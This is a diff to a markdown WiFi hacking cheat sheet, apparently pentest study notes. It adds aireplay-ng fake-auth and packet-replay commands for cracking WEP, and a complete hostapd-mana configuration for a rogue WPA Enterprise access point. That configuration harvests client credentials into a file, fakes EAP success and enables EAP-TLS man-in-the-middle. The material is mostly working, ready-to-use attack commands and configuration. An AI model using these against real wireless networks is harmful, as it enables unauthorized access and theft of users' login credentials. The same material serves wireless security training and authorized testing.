@@ -2,8 +2,6 @@
 
 This cheat sheet based on "WiFi Hacking Mind Map - v1.0 by Jérémy Brun-Nouvion (https://github.com/koutto)"
 
-Alsoo see my wifu.sh (to make all tasks easier)
-
 ## Monitoring
 ### Find all AP and connected devices
 ```
@@ -30,13 +28,20 @@ aireplay-ng -0 <deauth number> -a <AP MAC> -c <Client MAC> <interface> #Some cli
 
 ### Attack using Fake auth and ARP-replay (OPN)
 ```
-sudo aireplay-ng -1 6000 -a <AP_MAC> -o 1 -q 10 -h <host_MAC> <interface> # Fake auth
-sudo aireplay-ng -3 -b <AP_MAC> -h <host_MAC> <interface> # ARP replay
+aireplay-ng -1 60 -a <AP_MAC> -h <host_MAC> <interface> # Fake auth
+aireplay-ng -3 -b <AP_MAC> -h <host_MAC> <interface> # ARP replay
 aircrack-ng <*.cap>
+```
+### Interactive packet Replay (OPN)
+```
+aireplay-ng -1 60 -a <AP_MAC> -h <host_MAC> <interface> # Fake auth
+aireplay-ng -2 -b <AP_MAC> -d ff:ff:ff:ff:ff:ff <interface>
+
 ```
 
 ## Bypassing WEP (SKA)
 ```
+
 
 ```
 
@@ -109,6 +114,71 @@ dhclient <interface>
 ```
 
 ### WPA enterprise
+
+```
+# SSID of the AP
+ssid=Amaze_LLC
+
+# Network interface to use and driver type
+# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
+interface=wlan1
+driver=nl80211
+
+# Channel and mode
+# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
+channel=1
+# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
+hw_mode=g
+
+# Setting up hostapd as an EAP server
+ieee8021x=1
+eap_server=1
+
+# Key workaround for Win XP
+eapol_key_index_workaround=0
+
+# EAP user file we created earlier
+eap_user_file=mana.eap_user
+
+# Certificate paths created earlier
+ca_cert=/etc/freeradius/3.0/certs/ca.pem
+server_cert=/etc/freeradius/3.0/certs/server.pem
+private_key=/etc/freeradius/3.0/certs/server.key
+# The password is actually 'whatever'
+private_key_passwd=whatever
+dh_file=/etc/freeradius/3.0/certs/dh
+
+# Open authentication
+auth_algs=1
+# WPA/WPA2
+wpa=3
+# WPA Enterprise
+wpa_key_mgmt=WPA-EAP
+# Allow CCMP and TKIP
+# Note: iOS warns when network has TKIP (or WEP)
+wpa_pairwise=CCMP TKIP
+
+# Enable Mana WPE
+mana_wpe=1
+
+# Store credentials in that file
+mana_credout=/tmp/hostapd.credout
+
+# Send EAP success, so the client thinks it's connected
+mana_eapsuccess=1
+
+# EAP TLS MitM
+mana_eaptls=1
+```
+
+
+
+mana.eap_user
+```
+*     PEAP,TTLS,TLS,FAST,MD5,GTC
+"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
+```
+
 
 ```
 sudo dhclient <interface>
